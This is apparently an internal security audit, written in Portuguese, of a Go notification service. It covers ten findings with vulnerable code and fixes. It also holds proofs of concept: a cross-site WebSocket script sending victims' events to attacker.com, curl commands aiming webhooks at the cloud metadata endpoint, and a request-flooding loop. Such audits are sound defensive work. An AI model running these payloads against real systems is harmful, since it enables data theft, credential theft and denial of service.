# Catálogo de Vulnerabilidades

Última atualização: 2026-01-27

## Sumário

| ID | Severidade | Status | Título |
|----|------------|--------|--------|
| NOTIF-001 | CRITICAL | OPEN | WebSocket Origin Bypass (CSWSH) |
| NOTIF-002 | HIGH | OPEN | SSRF via Webhook URLs |
| NOTIF-003 | HIGH | OPEN | Sensitive Error Information Disclosure |
| NOTIF-004 | HIGH | OPEN | Missing Rate Limiting |
| NOTIF-005 | MEDIUM | OPEN | JWT Exposure in Environment Variables |
| NOTIF-006 | MEDIUM | OPEN | Weak RNG Error Handling |
| NOTIF-007 | MEDIUM | OPEN | Auth Mode Misconfiguration Risk |
| NOTIF-008 | MEDIUM | OPEN | Tenant Isolation Gap (ProjectID) |
| NOTIF-009 | MEDIUM | OPEN | Command Injection via Terminal |
| NOTIF-010 | LOW | OPEN | Missing Security Headers |

---

## NOTIF-001: WebSocket Origin Bypass (CSWSH)

**Severidade:** CRITICAL
**Status:** OPEN
**CVSS:** 8.1 (High)
**CWE:** CWE-346 (Origin Validation Error)

### Localização

```
internal/handler/subscribe.go:21-24
```

### Código Vulnerável

```go
var upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool {
        // TODO: Add proper origin validation in production
        return true  // VULNERABLE: Accepts any origin
    },
}
```

### Descrição

O WebSocket upgrader aceita conexões de qualquer origem, permitindo Cross-Site WebSocket Hijacking (CSWSH). Um atacante pode criar um site malicioso que estabelece conexões WebSocket em nome de usuários autenticados.

### Impacto

- Roubo de eventos em tempo real de outros usuários
- Injeção de eventos maliciosos
- Bypass de políticas same-origin

### PoC

```html
<!-- Hospedar em attacker.com -->
<script>
const ws = new WebSocket('wss://api.notif.sh/ws');
ws.onmessage = (e) => {
    // Exfiltra eventos da vítima
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: e.data
    });
};
</script>
```

### Exploit

```bash
go test ./exploits/websocket -v -run TestCSWSH
```

### Remediação

```go
var allowedOrigins = []string{
    "https://notif.sh",
    "https://app.notif.sh",
}

var upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool {
        origin := r.Header.Get("Origin")
        for _, allowed := range allowedOrigins {
            if origin == allowed {
                return true
            }
        }
        return false
    },
}
```

---

## NOTIF-002: SSRF via Webhook URLs

**Severidade:** HIGH
**Status:** OPEN
**CVSS:** 7.5 (High)
**CWE:** CWE-918 (Server-Side Request Forgery)

### Localização

```
internal/handler/webhook.go:43-74
internal/webhook/worker.go:274
```

### Código Vulnerável

```go
// Nenhuma validação de URL antes de criar webhook
func (h *WebhookHandler) Create(w http.ResponseWriter, r *http.Request) {
    var req CreateWebhookRequest
    // ...
    _, err = h.queries.CreateWebhook(ctx, db.CreateWebhookParams{
        Url: req.URL,  // URL não validada!
    })
}

// Worker faz request para qualquer URL
req, err := http.NewRequestWithContext(ctx, "POST", wh.Url, bytes.NewReader(body))
```

### Descrição

Webhooks podem apontar para qualquer URL, incluindo:
- IPs privados (127.0.0.1, 10.x.x.x, 192.168.x.x)
- Cloud metadata endpoints (169.254.169.254)
- Serviços internos

### Impacto

- Acesso a serviços internos
- Roubo de credenciais AWS/GCP via metadata
- Port scanning interno
- Bypass de firewalls

### PoC

```bash
# Criar webhook apontando para metadata AWS
curl -X POST https://api.notif.sh/api/v1/webhooks \
  -H "Authorization: Bearer nsh_xxx" \
  -d '{
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "topics": ["*"]
  }'

# Emitir evento para triggerar SSRF
curl -X POST https://api.notif.sh/api/v1/emit \
  -H "Authorization: Bearer nsh_xxx" \
  -d '{"topic": "test", "data": {}}'
```

### Exploit

```bash
go test ./exploits/ssrf -v -run TestSSRFMetadata
```

### Remediação

```go
func isValidWebhookURL(rawURL string) error {
    u, err := url.Parse(rawURL)
    if err != nil {
        return err
    }

    // Deve ser HTTPS em produção
    if u.Scheme != "https" {
        return errors.New("webhook URL must use HTTPS")
    }

    // Resolver hostname para IP
    ips, err := net.LookupIP(u.Hostname())
    if err != nil {
        return err
    }

    for _, ip := range ips {
        if ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast() {
            return errors.New("webhook URL cannot point to private IP")
        }
        // Block AWS/GCP metadata
        if ip.String() == "169.254.169.254" {
            return errors.New("webhook URL cannot point to metadata endpoint")
        }
    }

    return nil
}
```

---

## NOTIF-003: Sensitive Error Information Disclosure

**Severidade:** HIGH
**Status:** OPEN
**CVSS:** 5.3 (Medium)
**CWE:** CWE-209 (Error Message Information Leak)

### Localização

```
internal/handler/events.go:72
internal/handler/dlq.go:48, 143
internal/handler/schemas.go:48, 66, 130, 160, 210, 241, 313, 338
```

### Código Vulnerável

```go
writeJSON(w, http.StatusInternalServerError, map[string]string{
    "error": "failed to list DLQ: " + err.Error(),
})
```

### Descrição

Erros internos do sistema (database, NATS, etc) são retornados diretamente aos clientes, expondo:
- Estrutura do banco de dados
- Queries SQL
- Paths internos
- Stack traces

### Impacto

- Facilita reconhecimento para ataques
- Expõe arquitetura interna
- Pode vazar dados sensíveis em erros

### PoC

```bash
# Forçar erro de banco
curl https://api.notif.sh/api/v1/events?limit=abc
# Response: "failed to parse limit: strconv.Atoi: parsing \"abc\": invalid syntax"
```

### Remediação

```go
// Criar erro genérico para cliente
func writeInternalError(w http.ResponseWriter, err error, context string) {
    // Log detalhado interno
    slog.Error(context, "error", err)

    // Resposta genérica para cliente
    writeJSON(w, http.StatusInternalServerError, map[string]string{
        "error": "internal server error",
    })
}
```

---

## NOTIF-004: Missing Rate Limiting

**Severidade:** HIGH
**Status:** OPEN
**CVSS:** 7.5 (High)
**CWE:** CWE-770 (Allocation of Resources Without Limits)

### Localização

```
internal/server/routes.go (ausente)
internal/domain/apikey.go:17 (campo não usado)
```

### Código Vulnerável

```go
// Campo existe mas não é usado
type APIKey struct {
    // ...
    RateLimitPerSecond int32 // NOT ENFORCED!
}
```

### Descrição

Não há rate limiting implementado apesar do campo `RateLimitPerSecond` existir no modelo de API key. Isso permite:
- DoS via flooding de eventos
- Brute force de API keys
- Resource exhaustion

### Impacto

- Indisponibilidade do serviço
- Custos elevados de infra
- Degradação para outros usuários

### PoC

```bash
# Flood de eventos
for i in {1..10000}; do
  curl -X POST https://api.notif.sh/api/v1/emit \
    -H "Authorization: Bearer nsh_xxx" \
    -d '{"topic":"flood","data":{}}' &
done
```

### Exploit

```bash
go test ./exploits/dos -v -run TestRateLimitBypass
```

### Remediação

```go
// middleware/ratelimit.go
func RateLimit(queries *db.Queries) func(http.Handler) http.Handler {
    limiter := rate.NewLimiter(rate.Limit(100), 200) // default

    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            // Get API key specific limit
            if apiKey, ok := GetAPIKeyFromContext(r.Context()); ok {
                if apiKey.RateLimitPerSecond > 0 {
                    limiter = rate.NewLimiter(
                        rate.Limit(apiKey.RateLimitPerSecond),
                        int(apiKey.RateLimitPerSecond)*2,
                    )
                }
            }

            if !limiter.Allow() {
                http.Error(w, "rate limit exceeded", http.StatusTooManyRequests)
                return
            }
            next.ServeHTTP(w, r)
        })
    }
}
```

---

## NOTIF-005 a NOTIF-010

*(Documentação resumida - expandir conforme necessário)*

### NOTIF-005: JWT in Environment Variables
- **Local:** `internal/terminal/terminal.go:127`
- **Issue:** JWT passado como env var, visível em `/proc/*/environ`
- **Fix:** Usar stdin/pipe para passar credenciais

### NOTIF-006: Weak RNG Error Handling
- **Local:** `subscribe.go:48`, `webhook.go:318`, `terminal.go:106`
- **Issue:** `rand.Read()` erros ignorados
- **Fix:** Sempre verificar erro de `rand.Read()`

### NOTIF-007: Auth Mode Misconfiguration
- **Local:** `internal/middleware/unified.go:68`
- **Issue:** `AUTH_MODE` env var controla auth sem validação
- **Fix:** Validar configuração no startup

### NOTIF-008: Tenant Isolation Gap
- **Local:** `internal/handler/webhook.go:69`
- **Issue:** `ProjectID` opcional em webhooks
- **Fix:** Tornar ProjectID obrigatório

### NOTIF-009: Command Injection via Terminal
- **Local:** `internal/terminal/terminal.go:126`
- **Issue:** `CLI_BINARY_PATH` e `ProjectID` sem validação
- **Fix:** Validar paths e sanitizar inputs

### NOTIF-010: Missing Security Headers
- **Local:** `internal/server/routes.go`
- **Issue:** Headers de segurança ausentes
- **Fix:** Adicionar middleware com X-Frame-Options, CSP, etc.
